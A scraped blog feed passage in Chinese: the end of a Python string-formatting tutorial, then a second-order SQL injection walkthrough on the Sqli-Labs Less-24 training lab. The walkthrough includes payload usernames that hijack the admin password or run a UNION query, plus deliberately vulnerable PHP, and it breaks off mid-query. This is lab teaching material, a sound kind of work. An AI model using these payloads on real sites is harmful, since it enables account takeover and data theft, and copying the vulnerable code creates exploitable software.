class="line"></span><br><span class="line"><span class="comment"># 使用索引取对应位置的值(&#123;序号&#125;对应format序号)</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#x27;</span>.format(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>)) <span class="comment"># ACBA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过关键字or字典方式的方式格式化，打破了位置带来的限制与困扰(&#123;关键字&#125;=值)</span></span><br><span class="line">print(<span class="string">&#x27;我的名字是 &#123;name&#125;, 我的年龄是 &#123;age&#125;.&#x27;</span>.format(age=<span class="number">22</span>, name=<span class="string">&#x27;kinght&#x27;</span>))</span><br><span class="line">kwargs = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kinght&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span>&#125;    <span class="comment"># 字典</span></span><br><span class="line">print(<span class="string">&#x27;我的名字是 &#123;name&#125;, 我的年龄是 &#123;age&#125;.&#x27;</span>.format(**kwargs)) <span class="comment"># 使用字典key进行索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先取到值,然后在冒号后设定填充格式：</span></span><br><span class="line"><span class="comment"># &#123;0:[填充字符][对齐方式][宽度]&#125;  # 0为取值位置</span></span><br><span class="line"><span class="comment"># *&lt;10：左对齐，总共10个字符，不够的用*号填充</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:*&lt;10&#125;&#x27;</span>.format(<span class="string">&#x27;开始执行&#x27;</span>)) <span class="comment"># 开始执行******</span></span><br><span class="line"><span class="comment"># *&gt;10：右对齐，总共10个字符，不够的用*号填充</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:*&gt;10&#125;&#x27;</span>.format(<span class="string">&#x27;开始执行&#x27;</span>)) <span class="comment"># ******开始执行</span></span><br><span class="line"><span class="comment"># *^10：居中显示，总共10个字符，不够的用*号填充</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:*^10&#125;&#x27;</span>.format(<span class="string">&#x27;开始执行&#x27;</span>)) <span class="comment"># ***开始执行***</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 精度输出</span></span><br><span class="line">print(<span class="string">&#x27;&#123;salary:.3f&#125;&#x27;</span>.format(salary=<span class="number">3.14159264735</span>))  <span class="comment">#精确到小数点后3位，四舍五入，结果为：3.142</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:,&#125;&#x27;</span>.format(<span class="number">99812939393931</span>))  <span class="comment"># 千分位格式化，结果为：99,812,939,393,931</span></span><br><span class="line"><span class="comment"># 进制输出</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:b&#125;&#x27;</span>.format(<span class="number">123</span>))  <span class="comment"># 转成二进制，结果为：1111011</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:o&#125;&#x27;</span>.format(<span class="number">9</span>))  <span class="comment"># 转成八进制，结果为：11</span></span><br><span class="line">print(<span class="string">&#x27;&#123;0:x&#125;&#x27;</span>.format(<span class="number">15</span>))  <span class="comment"># 转成十六进制，结果为：f</span></span><br></pre></td></tr></table></figure><h2 id="f-Strings"><a href="#f-Strings" class="headerlink" title="f-Strings"></a>f-Strings</h2><p>str.format() 比 %格式化高级了一些，但是它还是有自己的缺陷。当需要传入的字符串过多时，仍然会显得非常冗长。与在Python 3.6中引入 了f-strings，不仅比str.format更简洁，性能上也更胜一筹</p><p> f-string是以f或F开头的字符串， 核心在于字符串中符号{}的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#125;中可以是变量名</span></span><br><span class="line">name = <span class="string">&#x27;kinght&#x27;</span></span><br><span class="line">age = <span class="number">22</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;age&#125;</span>&#x27;</span>)  <span class="comment"># kinght 22</span></span><br><span class="line">print(F<span class="string">&#x27;&#123;age&#125; &#123;name&#125;&#x27;</span>)  <span class="comment"># 22 kinght</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#125;中可以是表达式</span></span><br><span class="line"><span class="comment"># 可以在&#123;&#125;中放置任意合法的Python表达式，会在运行时计算</span></span><br><span class="line"><span class="comment"># 比如：数学表达式</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="number">3</span>*<span class="number">3</span>/<span class="number">2</span>&#125;</span>&#x27;</span>) <span class="comment"># 4.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数的调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">n</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;foo say hello&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;foo(<span class="number">10</span>)&#125;</span>&#x27;</span>) <span class="comment"># 会调用foo(10),然后打印其返回值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用对象的方法</span></span><br><span class="line">name=<span class="string">&#x27;kinght&#x27;</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;name.lower()&#125;</span>&#x27;</span>) <span class="comment"># kinght</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在类中的使用</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">object</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line"><span class="meta">... </span>        self.name = name</span><br><span class="line"><span class="meta">... </span>        self.age = age</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>:<span class="subst">&#123;self.age&#125;</span>&#x27;</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="string">f&#x27;===&gt;<span class="subst">&#123;self.name&#125;</span>:<span class="subst">&#123;self.age&#125;</span>&lt;===&#x27;</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj=Person(<span class="string">&#x27;kinght&#x27;</span>,<span class="number">18</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(obj) <span class="comment"># 触发__str__</span></span><br><span class="line">egon:<span class="number">18</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj        <span class="comment"># 触发__repr__</span></span><br><span class="line">===&gt;kinght:18&lt;===</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># 在f-Strings中的使用</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;obj&#125;</span>&#x27;</span>   <span class="comment"># 触发__str__</span></span><br><span class="line"><span class="string">&#x27;egon:18&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;obj!r&#125;</span>&#x27;</span> <span class="comment"># 触发__repr__</span></span><br><span class="line"><span class="string">&#x27;===&gt;kinght:18&lt;===&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当格式化字符串过长时，如下列表info</span></span><br><span class="line">name = <span class="string">&#x27;kinght&#x27;</span></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">gender = <span class="string">&#x27;male&#x27;</span></span><br><span class="line">hobbie1=<span class="string">&#x27;play&#x27;</span></span><br><span class="line">hobbie2=<span class="string">&#x27;eat&#x27;</span></span><br><span class="line">hobbie3=<span class="string">&#x27;read&#x27;</span></span><br><span class="line">info = [<span class="string">f&#x27;名字：<span class="subst">&#123;name&#125;</span>年龄：<span class="subst">&#123;age&#125;</span>性别：<span class="subst">&#123;gender&#125;</span>&#x27;</span>,<span class="string">f&#x27;第一个爱好：<span class="subst">&#123;hobbie1&#125;</span>第二个爱好：<span class="subst">&#123;hobbie2&#125;</span>第三个爱好：<span class="subst">&#123;hobbie3&#125;</span>&#x27;</span>] </span><br><span class="line"><span class="comment"># 我们可以回车分隔到多行，注意每行前都有一个f</span></span><br><span class="line">info = [</span><br><span class="line">    <span class="comment"># 第一个元素</span></span><br><span class="line">    <span class="string">f&#x27;名字：<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;年龄：<span class="subst">&#123;age&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;性别：<span class="subst">&#123;gender&#125;</span>&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二个元素</span></span><br><span class="line">    <span class="string">f&#x27;第一个爱好：<span class="subst">&#123;hobbie1&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;第二个爱好：<span class="subst">&#123;hobbie2&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;第三个爱好：<span class="subst">&#123;hobbie3&#125;</span>&#x27;</span></span><br><span class="line">]</span><br><span class="line">print(info)<span class="comment"># [&#x27;名字：kinght年龄：18性别：male&#x27;, &#x27;第一个爱好：play第二个爱好：eat第三个爱好：read&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 引号的嵌套</span></span><br><span class="line"><span class="comment"># 当字符串嵌套发送冲突时，与正常的字符串处理方式是一样的</span></span><br><span class="line"><span class="comment"># 1、外层为单引号，内层嵌套也为单引号，并且想要输入的内容也为单引号，那么外层需要改用双引号</span></span><br><span class="line">print(<span class="string">&quot;my name is &#x27;kinght&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 2、外层为单引号，内层嵌套也为单引号，并且想要输入的内容也为单引号，需要用到转义</span></span><br><span class="line">print(<span class="string">&#x27;my name is \&#x27;kinght\&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###注意</span></span><br><span class="line"><span class="comment">#1、反斜杠可以用来进行字符转义，但不能用在&#123;&#125;的表达式中</span></span><br><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="number">1</span>\<span class="number">2</span>&#125;</span>&#x27;</span> <span class="comment"># 语法错误</span></span><br><span class="line"><span class="comment">#2、注释#号也不能出现在&#123;&#125;的表达式中</span></span><br><span class="line">f&#x27;&#123;x#&#125;&#x27; # 语法错误</span><br><span class="line"></span><br><span class="line"><span class="comment">#基于注意，不能在&#123;&#125;内出现反斜杠\，所以，当我们的输出的结果中需要包含&#123;&#125;时，下面的做法就是错误的</span></span><br><span class="line">print(<span class="string">f&#x27;\&#123;天王盖地虎\&#125;&#x27;</span>) <span class="comment"># 错误</span></span><br><span class="line"><span class="comment">#类似于输出%号的做法</span></span><br><span class="line">print(<span class="string">&#x27;%s%%&#x27;</span> %<span class="number">30</span>)</span><br><span class="line"><span class="number">30</span>%</span><br><span class="line"><span class="comment">#若想输出&#123;&#125;,那么需要在原有的基础上再套一层，如下</span></span><br><span class="line">print(<span class="string">f&#x27;&#123;&#123;天王盖地虎&#125;&#125;&#x27;</span>) <span class="comment"># &#123;天王盖地虎&#125;</span></span><br><span class="line">print(<span class="string">f&#x27;&#123;&#123;&#123;&#123;天王盖地虎&#125;&#125;&#125;&#125;&#x27;</span>) <span class="comment"># &#123;&#123;天王盖地虎&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 性能对比=&gt;f_Stings性能最高</span></span><br><span class="line"><span class="keyword">from</span> timeit <span class="keyword">import</span> timeit</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_s</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;Egon&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%s:%s.&#x27;</span> % (name, age)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_format</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;Egon&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#125;:&#123;&#125;.&#x27;</span>.format(name, age)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_f_strings</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;Egon&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>:<span class="subst">&#123;age&#125;</span>.&#x27;</span></span><br><span class="line">res1 = timeit(test_s, number=<span class="number">1000000</span>)</span><br><span class="line">res2 = timeit(test_format, number=<span class="number">1000000</span>)</span><br><span class="line">res3 = timeit(test_f_strings, number=<span class="number">1000000</span>)</span><br><span class="line">print(res1) <span class="comment"># 0.3709844550030539</span></span><br><span class="line">print(res2) <span class="comment"># 0.47834375899401493</span></span><br><span class="line">print(res3) <span class="comment"># 0.3111891380031011, 最快</span></span><br></pre></td></tr></table></figure><h2 id="标准库模板"><a href="#标准库模板" class="headerlink" title="标准库模板"></a>标准库模板</h2><p> 从Python 2.4起，Python标准库string引入了Template也可以用来格式化字符串，所以说，与前三种方式的一个显著区别就是：Template并属于python语言的核心语法特征，使用方式如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line">name=<span class="string">&#x27;kinght&#x27;</span></span><br><span class="line">t = Template(<span class="string">&#x27;Hello $name!&#x27;</span>)</span><br><span class="line">res=t.substitute(name=name)</span><br><span class="line"></span><br><span class="line">print(res)  <span class="comment"># Hello kinght!</span></span><br></pre></td></tr></table></figure><p>另外一个不同的地方是这个模板字符串不支持类似str.format那样的进制转换，需要我们自己处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">name=<span class="string">&#x27;kinght&#x27;</span></span><br><span class="line">templ_string = <span class="string">&#x27;Hello $name, there is a $error error!!!&#x27;</span></span><br><span class="line">res=Template(templ_string).substitute(name=name, error=hex(<span class="number">12345</span>))</span><br><span class="line"></span><br><span class="line">print(res) <span class="comment"># Hello kinght, there is a 0x3039 error!!!</span></span><br></pre></td></tr></table></figure><p>使用模板字符串Template的最佳的时机就是当你的程序需要处理由用户提供的输入内容时。模板字符串是最保险的选择，因为可以降低复杂性。</p><p>其他一些复杂的字符串格式化技巧的可能会给你的程序带来安全漏洞</p><h2 id="总结四种方式的应用场景"><a href="#总结四种方式的应用场景" class="headerlink" title="总结四种方式的应用场景"></a>总结四种方式的应用场景</h2><p>1、如果格式化的字符串是由用户输入的，那么基于安全性考虑，推荐使用Template</p><p>2、如果使用的python3.6+版本的解释器，推荐使用f-Stings</p><p>3、如果要兼容python2.x版本的python解释器，推荐使用str.format</p><p>4、如果不是测试的代码，不推荐使用%</p><h2 id="print补充知识"><a href="#print补充知识" class="headerlink" title="print补充知识"></a>print补充知识</h2><p>在python中，使用print的时候，会默认添加换行符，我们可以通过添加<code>end=&#39;&#39;</code>的形式将添加的换行符替换掉，来阻止换行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;hello&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;world&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201011111823286.png" alt="image-20201011111823286"></p><p>也可以进行其他替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;hello&#x27;</span>,end=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;world&#x27;</span>)  <span class="comment">#hello*world</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.二次注入</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/10.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/10.%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>二次注入与其他的注入不同，他不能再当前页面通过反馈来获取或者判断页面的信息，而是需要绕一个圈</p><hr><h1 id="二次注入的原理"><a href="#二次注入的原理" class="headerlink" title="二次注入的原理"></a>二次注入的原理</h1><p>二次注入主要分为两步</p><p>第一步：插入恶意数据</p><a id="more"></a><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身就包含恶意内容</p><p>第二部：引用恶意数据</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，就会造成二次注入</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822164457196.png" alt="image-20200822164457196"></p><hr><h1 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h1><p>先使用Sqli-Labs Less24，进行一下简单的演示</p><p>打开网页查看 <code>http://192.168.101.200/Less-24/</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822231212531.png" alt="image-20200822231212531"></p><p>这是一个很普通的登录窗口，我们假设知道它的账号admin，不知道它的密码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822231646047.png" alt="image-20200822231646047"></p><p>我们现在创建一个账号，账号名字为admin’#，密码为123</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822231814365.png" alt="image-20200822231814365"></p><p>然后输入账号密码就能登陆了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822231918564.png" alt="image-20200822231918564"></p><p>sql数据库里面也有了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822232003478.png" alt="image-20200822232003478"></p><p>然后我们现在来修改密码，修改密码为1234567</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822232201605.png" alt="image-20200822232201605"></p><p>我们再来看数据库，账户名为admin’#的账号密码没有被修改，而admin账号密码被修改了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822232318242.png" alt="image-20200822232318242"></p><p>使用账号admin和密码1234567也就能登陆了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822232406255.png" alt="image-20200822232406255"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理很简单，从数据库中取出的恶意数据，没有得到校验，直接被带入了修改密码的sql语句中</p><p>我们知道修改密码的页面是<code>http://192.168.101.200/Less-24/pass_change.php</code></p><p>查看pass_change.php的源代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822233056247.png" alt="image-20200822233056247"></p><p>虽然<code>$pass</code>得到了加工，但我们这里下手目标是<code>$username</code>，我们在修改密码的时候，我们的账户名是admin’#，即<code>$username=admin&#39;#</code>，完成了语句的构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;1234567&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><p>实际生效的代码就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;UPDATE users SET PASSWORD&#x3D;&#39;1234567&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><p>所以修改的就是admin账号</p><h2 id="攻击演示-1"><a href="#攻击演示-1" class="headerlink" title="攻击演示"></a>攻击演示</h2><p>为了更直观的进行演示，需要对Sqli-Labs Less24进行一些修改</p><p>首先执行SQL语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE &#96;users&#96; CHANGE &#96;username&#96; &#96;username&#96; VARCHAR(255) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL;</span><br></pre></td></tr></table></figure><p>修改username字段长度容量为255</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822173556733.png" alt="image-20200822173556733"></p><p>在Less24中创建文件userlist.php，这个文件的功能就是显示所有用户的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;doublecode&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY id asc&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;$num;++$j)&#123;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">$username = $row[<span class="number">1</span>];</span><br><span class="line">$sql_detail = <span class="string">&quot;SELECT * FROM users where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$result_detail = mysql_query($sql_detail);</span><br><span class="line">$num_detail = mysql_num_rows($result_detail);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;$num_detail;++$i)&#123;</span><br><span class="line">$row_detail = mysql_fetch_array($result_detail);</span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;END</span><br><span class="line">&lt;table border=<span class="string">&quot;1&quot;</span> style=<span class="string">&quot;table-layout:fixed;&quot;</span> width=<span class="string">&quot;1000&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;$row_detail[<span class="number">1</span>]&lt;/th&gt;</span><br><span class="line">&lt;th&gt;$row_detail[<span class="number">2</span>]&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">END;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开页面就是这个样子</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822235217611.png" alt="image-20200822235217611"></p><p>首先我们这次还是创建一个用户<code>http://192.168.101.200/Less-24/new_user.php</code></p><p>这次用户名命为<code>1&#39; union select 1,user(),3#</code>，打开userlist.php文件，我们就可以看到一个新用户</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200822235807646.png" alt="image-20200822235807646"></p><p>注入成功了，我们来看看userlist.php的代码变化，输出语句是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql_detail &#x3D; &quot;SELECT * FROM users where username &#x3D; &#39;$username&#39;&quot;;</span><br></pre></td></tr></table></figure><p>但是由于我们的用户名是<code>1&#39; union select 1,user(),3#</code>，故构成语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; 1&#39; union select 